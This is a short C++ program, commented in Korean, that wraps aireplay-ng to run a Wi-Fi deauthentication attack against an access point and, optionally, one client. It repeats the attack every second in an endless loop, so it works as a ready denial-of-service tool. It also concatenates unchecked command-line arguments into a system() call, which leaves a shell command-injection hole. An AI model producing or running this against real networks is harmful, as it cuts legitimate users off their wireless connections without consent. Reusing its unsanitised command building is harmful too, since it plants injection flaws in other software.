#include <iostream>
#include <cstdlib>
#include <string>
#include <thread>
#include <chrono>

using namespace std;

void usage() {
    cout << "Usage: deauth <interface> <ap mac> [<station mac> [-auth]]\n";
    cout << "Sample: deauth mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

void runDeauthAttack(const string& interface, const string& apMac, const string& stationMac = "", bool auth = false) {
    string command = "aireplay-ng ";
    if (auth) {
        command += "-1 0 ";
    } else {
        command += "-0 1 ";
    }
    command += interface + " -a " + apMac;
    if (!stationMac.empty()) {
        command += " -c " + stationMac;
    }

    cout << "Running command: " << command << endl;
    system(command.c_str());
}


int main(int argc, char* argv[]) {
    if (argc < 3 || argc > 5) {
        usage();
        return 1;
    }

    string interface = argv[1];
    string apMac = argv[2];
    string stationMac = "";
    bool auth = false;

    if (argc >= 4) {
        stationMac = argv[3];
    }

    if (argc == 5 && string(argv[4]) == "-auth") {
        auth = true;
    }

    while (true) { // 무한 루프
        runDeauthAttack(interface, apMac, stationMac, auth);
        this_thread::sleep_for(chrono::seconds(1)); // 1초 대기
    }
    
    return 0;
}
